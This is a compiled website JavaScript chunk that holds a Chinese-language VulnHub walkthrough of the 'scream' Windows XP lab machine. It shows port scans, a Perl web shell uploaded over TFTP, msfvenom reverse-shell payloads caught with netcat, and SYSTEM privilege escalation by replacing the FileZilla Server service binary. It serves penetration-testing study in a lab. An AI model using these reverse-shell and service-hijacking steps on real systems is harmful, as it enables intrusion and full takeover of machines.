"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[5097],{5521:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>t,contentTitle:()=>c,default:()=>p,frontMatter:()=>o,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/scream","title":"scream","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/scream.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/scream","permalink":"/docs/VulnHub/Virtual Machines/scream","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/scream.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"pwnosv2","permalink":"/docs/VulnHub/Virtual Machines/pwnosv2"},"next":{"title":"sickos1.1-cms","permalink":"/docs/VulnHub/Virtual Machines/sickos1.1-cms"}}');var i=r(4848),l=r(8453);const o={},c=void 0,t={},a=[{value:"port scan",id:"port-scan",level:2},{value:"FTP &amp; TFTP",id:"ftp--tftp",level:2},{value:"perl webshell",id:"perl-webshell",level:2},{value:"reverse shell",id:"reverse-shell",level:2},{value:"Privilege Escalation",id:"privilege-escalation",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,l.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h2,{id:"port-scan",children:"port scan"}),"\n",(0,i.jsx)(n.p,{children:"TCP"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Sun Nov 10 05:54:29 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.27.7\r\nNmap scan report for 192.168.27.7\r\nHost is up (0.00080s latency).\r\nNot shown: 65531 filtered tcp ports (no-response)\r\nPORT   STATE SERVICE\r\n21/tcp open  ftp\r\n22/tcp open  ssh\r\n23/tcp open  telnet\r\n80/tcp open  http\r\nMAC Address: 00:0C:29:45:0C:1E (VMware)\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Sun Nov 10 05:56:52 2024 as: nmap -sT -sV -sC -O -p21,22,23,80 -oN nmap_results/detils_scan 192.168.27.7\r\nNmap scan report for 192.168.27.7\r\nHost is up (0.00076s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)\r\n|_ftp-bounce: bounce working!\r\n| ftp-syst: \r\n|_  SYST: UNIX emulated by FileZilla\r\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r\n| drwxr-xr-x 1 ftp ftp              0 Nov 10 18:37 bin\r\n| drwxr-xr-x 1 ftp ftp              0 Nov 10 18:37 log\r\n|_drwxr-xr-x 1 ftp ftp              0 Nov 10 18:37 root\r\n22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)\r\n|_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)\r\n23/tcp open  telnet\r\n| fingerprint-strings: \r\n|   GenericLines, NCP, RPCCheck, tn3270: \r\n|     Scream Telnet Service\r\n|     login:\r\n|   GetRequest: \r\n|     HTTP/1.0\r\n|     Scream Telnet Service\r\n|     login:\r\n|   Help: \r\n|     HELP\r\n|     Scream Telnet Service\r\n|     login:\r\n|   SIPOptions: \r\n|     OPTIONS sip:nm SIP/2.0\r\n|     Via: SIP/2.0/TCP nm;branch=foo\r\n|     From: <sip:nm@nm>;tag=root\r\n|     <sip:nm2@nm2>\r\n|     Call-ID: 50000\r\n|     CSeq: 42 OPTIONS\r\n|     Max-Forwards: 70\r\n|     Content-Length: 0\r\n|     Contact: <sip:nm@nm>\r\n|     Accept: application/sdp\r\n|     Scream Telnet Service\r\n|_    login:\r\n80/tcp open  http    Tinyweb httpd 1.93\r\n|_http-title: The Scream - Edvard Munch\r\n|_http-server-header: TinyWeb/1.93\r\nMAC Address: 00:0C:29:45:0C:1E (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning (JUST GUESSING): Microsoft Windows 2000|XP|2003 (93%)\r\nOS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003\r\nAggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (93%), Microsoft Windows XP SP2 (93%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP3 (91%), Microsoft Windows 2000 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP0 (87%), Microsoft Windows XP SP2 or Windows Server 2003 (87%), Microsoft Windows Server 2003 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 1 hop\r\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"Microsoft Windows 2000|XP|2003 (93%)"}),"windows\u673a\u5668"]}),"\n",(0,i.jsx)(n.p,{children:"UDP"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Sun Nov 10 05:55:04 2024 as: nmap -sU --min-rate 10000 -p- -oN nmap_results/udp_scan 192.168.27.7\r\nNmap scan report for 192.168.27.7\r\nHost is up (0.00097s latency).\r\nNot shown: 65534 open|filtered udp ports (no-response)\r\nPORT   STATE SERVICE\r\n69/udp open  tftp\r\nMAC Address: 00:0C:29:45:0C:1E (VMware)\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Nmap 7.94SVN scan initiated Sun Nov 10 05:57:30 2024 as: nmap -sU -sV -sC -O -p69 -oN nmap_results/udp_detils_scan 192.168.27.7\r\nNmap scan report for 192.168.27.7\r\nHost is up (0.00073s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n69/udp open  tftp\r\n| fingerprint-strings: \r\n|   DNSStatusRequest: \r\n|_    Unknown Transfer Id\r\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\r\nSF-Port69-UDP:V=7.94SVN%I=7%D=11/10%Time=6730919F%P=x86_64-pc-linux-gnu%r(\r\nSF:DNSStatusRequest,18,"\\0\\x05\\0\\x05Unknown\\x20Transfer\\x20Id\\0");\r\nMAC Address: 00:0C:29:45:0C:1E (VMware)\r\nToo many fingerprints match this host to give specific OS details\r\nNetwork Distance: 1 hop\n'})}),"\n",(0,i.jsxs)(n.p,{children:["21\u7aef\u53e3\u53ef\u4ee5\u533f\u540d\u767b\u5f55\uff0c69\u7aef\u53e3\u5f00\u653e",(0,i.jsx)(n.code,{children:"tftp"}),"\u670d\u52a1"]}),"\n",(0,i.jsx)(n.h2,{id:"ftp--tftp",children:"FTP & TFTP"}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u533f\u540d\u767b\u5f55\uff0c\u4e0d\u80fdget\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-ftp",children:'ftp> ls\r\n229 Entering Extended Passive Mode (|||1116|)\r\n150 Connection accepted\r\ndrwxr-xr-x 1 ftp ftp              0 Nov 10 18:37 bin\r\ndrwxr-xr-x 1 ftp ftp              0 Nov 10 18:37 log\r\ndrwxr-xr-x 1 ftp ftp              0 Nov 10 19:32 root\r\n226 Transfer OK\r\nftp> cd root\r\n250 CWD successful. "/root" is current directory.\r\nftp> ls\r\n229 Entering Extended Passive Mode (|||1117|)\r\n150 Connection accepted\r\ndrwxr-xr-x 1 ftp ftp              0 Nov 11 11:57 cgi-bin\r\n---------- 1 ftp ftp          14539 Oct 31  2012 index.html\r\n226 Transfer OK\n'})}),"\n",(0,i.jsx)(n.p,{children:"tftp\u670d\u52a1\u4e0d\u80fd\u67e5\u770b\u6587\u4ef6"}),"\n",(0,i.jsxs)(n.p,{children:["\u611f\u89c9",(0,i.jsx)(n.code,{children:"root"}),"\u76ee\u5f55\u50cf\u662f\u4e00\u4e2aweb\u76ee\u5f55\uff0c\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"http://192.168.27.7/index.html"}),"\uff0c\u8bbf\u95ee\u6210\u529f"]}),"\n",(0,i.jsxs)(n.p,{children:["\u90a3\u5c31\u5229\u7528",(0,i.jsx)(n.code,{children:"tftp"}),"\u5c1d\u8bd5\u662f\u5426\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"tftp> put 1.php"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/scream]\r\n\u2514\u2500# curl http://192.168.27.7/1.php\r\n<?php phpinfo();\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u8bbf\u95ee\u5230\uff0c\u4f46\u6ca1\u6709\u89e3\u6790"}),"\n",(0,i.jsxs)(n.p,{children:["web\u76ee\u5f55\u4e0b\u8fd8\u6709",(0,i.jsx)(n.code,{children:"cgi-bin"}),"\u76ee\u5f55"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"cgi-bin"})," \u662f\u4e00\u4e2a\u901a\u5e38\u7528\u4e8e\u5b58\u653e CGI\uff08Common Gateway Interface\uff09\u811a\u672c\u7684\u76ee\u5f55\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5728 ",(0,i.jsx)(n.code,{children:"cgi-bin"})," \u76ee\u5f55\u4e2d\u53ef\u4ee5\u6267\u884c\u670d\u52a1\u5668\u7aef\u8bed\u8a00\u7f16\u5199\u7684\u811a\u672c\uff0c\u5982 Perl\u3001Python\u3001PHP"]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6d4b\u8bd5\u53d1\u73b0",(0,i.jsx)(n.code,{children:"perl"}),"\u8bed\u8a00\u53ef\u4ee5\u6210\u529f\u6267\u884c"]}),"\n",(0,i.jsx)(n.h2,{id:"perl-webshell",children:"perl webshell"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://github.com/rafalrusin/web-shell/blob/master/web-shell.pl",children:"https://github.com/rafalrusin/web-shell/blob/master/web-shell.pl"})}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241111180851340.png",alt:"image-20241111180851340"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4fee\u6539\u4e00\u4e0b\u5bc6\u7801\u62ff\u8fc7\u6765\u7528\uff0c\u4e0a\u4f20\u5230",(0,i.jsx)(n.code,{children:"cgi-bin"}),"\u76ee\u5f55\u4e0b"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"tftp> put shell.pl cgi-bin/shell.pl\n"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://192.168.27.7/cgi-bin/shell.pl?command=echo+%25username%25&password=123456&pwd=",children:"http://192.168.27.7/cgi-bin/shell.pl?command=echo+%25username%25&password=123456&pwd="})}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529f\u6267\u884c\u547d\u4ee4"}),"\n",(0,i.jsx)(n.h2,{id:"reverse-shell",children:"reverse shell"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528",(0,i.jsx)(n.code,{children:"msfvenom"}),"\u751f\u6210\u4e00\u4e2ax86\u7684\u53cd\u5f39shell"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/shell_reverse_tcp lhost=192.168.27.3 lport=1234 -f exe -o reverse.exe\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u540c\u6837\uff0c\u4e0a\u4f20\u5230",(0,i.jsx)(n.code,{children:"cgi-bin"}),"\u4e0b"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://192.168.27.7/cgi-bin/shell.pl?command=reverse.exe&password=123456&pwd=",children:"http://192.168.27.7/cgi-bin/shell.pl?command=reverse.exe&password=123456&pwd="})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/scream]\r\n\u2514\u2500# rlwrap nc -lvnp 1234\r\nlistening on [any] 1234 ...\r\nconnect to [192.168.27.3] from (UNKNOWN) [192.168.27.7] 1128\r\nMicrosoft Windows XP [Version 5.1.2600]\r\n(C) Copyright 1985-2001 Microsoft Corp.\r\n\r\nc:\\www\\root\\cgi-bin>echo %username%\r\necho %username%\r\nalex\n"})}),"\n",(0,i.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege Escalation"}),"\n",(0,i.jsx)(n.p,{children:"\u6536\u96c6\u4fe1\u606f"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"systeminfo"}),"\n",(0,i.jsx)(n.p,{children:"tasklist /V"}),"\n",(0,i.jsx)(n.p,{children:"net start"}),"\n",(0,i.jsx)(n.p,{children:"sc query"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cmd",children:"c:\\www\\root\\cgi-bin>tasklist /V | findstr SYSTEM\r\ntasklist /V | findstr SYSTEM\r\nFileZilla server.exe     2856    Console  0      2,916 K Running         NT AUTHORITY\\SYSTEM\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u67e5\u770b\u4efb\u52a1\u5217\u8868\uff0c\u67e5\u627e",(0,i.jsx)(n.code,{children:"SYSTEM"}),"\u6743\u9650\u7684\u7a0b\u5e8f"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cmd",children:"c:\\www\\root\\cgi-bin>net start\r\nnet start\r\nFileZilla Server FTP server\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53ef\u4ee5\u52ab\u6301",(0,i.jsx)(n.code,{children:"FileZilla server.exe"}),"\u62ff\u5230\u4e00\u4e2a\u53cd\u5f39shell"]}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528",(0,i.jsx)(n.code,{children:"msfvenom"}),"\u6210\u529f\u4e00\u4e2a\u53cd\u5f39shell\uff0c\u8bbe\u7f6e\u76d1\u542c",(0,i.jsx)(n.code,{children:"1235"}),"\u7aef\u53e3"]}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u751f\u6210\u7684exe\u6587\u4ef6\u4e0a\u4f20cgi-bin\u76ee\u5f55"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"FileZilla server.exe"}),"\u76ee\u5f55\u4e3a\uff1a",(0,i.jsx)(n.code,{children:"C:\\Program Files\\FileZilla Server"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cmd",children:"C:\\Program Files\\FileZilla Server>dir\r\ndir\r\n Volume in drive C has no label.\r\n Volume Serial Number is D891-2687\r\n\r\n Directory of C:\\Program Files\\FileZilla Server\r\n\r\n11/11/2024  05:50 PM    <DIR>          .\r\n11/11/2024  05:50 PM    <DIR>          ..\r\n02/26/2012  06:42 AM         1,044,992 FileZilla Server Interface.exe\r\n02/07/2013  11:10 PM               525 FileZilla Server Interface.xml\r\n02/26/2012  06:42 AM           632,320 FileZilla server.exe\r\n11/01/2012  11:06 AM             5,662 FileZilla Server.xml\r\n02/26/2012  06:42 AM            82,944 FzGSS.dll\r\n02/22/2012  02:10 PM             1,208 legal.htm\r\n02/26/2012  06:50 AM         1,111,040 libeay32.dll\r\n11/06/2011  04:27 AM            18,348 license.txt\r\n02/26/2012  06:41 AM            38,614 readme.htm\r\n02/26/2012  06:50 AM           276,480 ssleay32.dll\r\n11/10/2024  06:36 PM            46,930 Uninstall.exe\r\n              11 File(s)      3,332,865 bytes\r\n               2 Dir(s)  40,085,143,552 bytes free\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u590d\u5236\u5230\u5f53\u524d\u76ee\u5f55\uff0c\u6682\u505cFTP\u670d\u52a1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cmd",children:'C:\\Program Files\\FileZilla Server>copy c:\\www\\root\\cgi-bin\\PE.exe pe.exe\r\ncopy c:\\www\\root\\cgi-bin\\PE.exe pe.exe\r\nC:\\Program Files\\FileZilla Server>net stop "FileZilla Server FTP server"\r\nnet stop "FileZilla Server FTP server"\r\nThe FileZilla Server FTP server service is stopping.\r\nThe FileZilla Server FTP server service was stopped successfully.\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u91cd\u547d\u540d\u4e3a",(0,i.jsx)(n.code,{children:"FileZilla server.exe"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cmd",children:'C:\\Program Files\\FileZilla Server>move pe.exe "FileZilla server.exe"\r\nmove pe.exe "FileZilla server.exe"\r\nOverwrite C:\\Program Files\\FileZilla Server\\FileZilla server.exe? (Yes/No/All): yes\r\nyes\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u542f\u52a8FTP\u670d\u52a1555"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cmd",children:'C:\\Program Files\\FileZilla Server>net start "FileZilla Server FTP server"\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5e76\u76d1\u542c1235"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/scream]\r\n\u2514\u2500# rlwrap nc -lvnp 1235\r\nlistening on [any] 1235 ...\r\nconnect to [192.168.27.3] from (UNKNOWN) [192.168.27.7] 1134\r\nMicrosoft Windows XP [Version 5.1.2600]\r\n(C) Copyright 1985-2001 Microsoft Corp.\r\n\r\nC:\\WINDOWS\\system32>tasklist /V | findstr SYSTEM\r\ncmd.exe  3196  Console   0   2,472 K Running   NT AUTHORITY\\SYSTEM   0:00:00 C:\\WINDOWS\\system32\\cmd.exe\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529f\u62ff\u5230SYSTEM\u6743\u9650"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u8fd9\u662f\u7b2c\u4e00\u6b21\u6253windows\u673a\u5668\uff0c\u54c8\u54c8"}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>o,x:()=>c});var s=r(6540);const i={},l=s.createContext(i);function o(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);